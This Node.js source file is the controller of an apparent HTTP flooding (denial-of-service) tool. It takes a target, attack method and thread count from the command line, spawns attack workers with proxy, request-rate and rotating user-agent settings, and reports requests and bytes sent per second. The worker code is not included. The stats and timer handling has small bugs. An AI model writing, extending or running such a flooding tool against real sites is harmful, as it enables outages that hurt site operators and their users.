const cluster = require("cluster");
const config = require("./config");
const AttackWorker = require("./attack-worker");

class Attack {
  constructor(options) {
    this.options = {
      ...config.DEFAULT_CONFIG,
      ...options,
    };

    this.workers = new Set();
    this.stats = {
      requestsSent: 0,
      bytesSent: 0,
    };
  }

  async start() {
    console.log(`Starting attack with ${this.options.threads} threads`);

    for (let i = 0; i < this.options.threads; i++) {
      const worker = new AttackWorker();
      worker.init({
        target: this.options.target,
        method: this.options.method,
        rpc: this.options.rpc,
        proxy: this.options.proxy,
        userAgents: config.USER_AGENTS,
      });
      this.workers.add(worker);
    }

    const monitor = setInterval(() => {
      this.printStats();
    }, 1000);

    setTimeout(() => {
      this.stop();
      clearInterval(monitor);
    }, this.options.duration * 1000);
  }

  async stop() {
    console.log("Stopping attack...");
    if (this.monitor) {
      clearInterval(this.monitor);
    }
    this.workers.forEach((worker) => {
      if (worker.METHODS) {
        worker.METHODS = {};
      }
    });
    this.workers.clear();
    try {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      process.exit(0);
    } catch (err) {
      process.exit(1);
    }
  }

  printStats() {
    const stats = Array.from(this.workers).reduce(
      (acc, w) => {
        acc.requestsSent += w.stats.requestsSent;
        acc.bytesSent += w.stats.bytesSent;
        return acc;
      },
      { requestsSent: 0, bytesSent: 0 }
    );

    console.log(`
      Requests/sec: ${stats.requestsSent}
      Bytes/sec: ${this.formatBytes(stats.bytesSent)}
    `);
  }

  formatBytes(bytes) {
    const sizes = ["B", "KB", "MB", "GB"];
    if (bytes === 0) return "0 B";
    const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
    return Math.round(bytes / Math.pow(1024, i), 2) + " " + sizes[i];
  }
}

if (require.main === module) {
  const attack = new Attack({
    target: process.argv[2],
    method: process.argv[3],
    threads: parseInt(process.argv[4]),
  });
  attack.start();
}

module.exports = Attack;
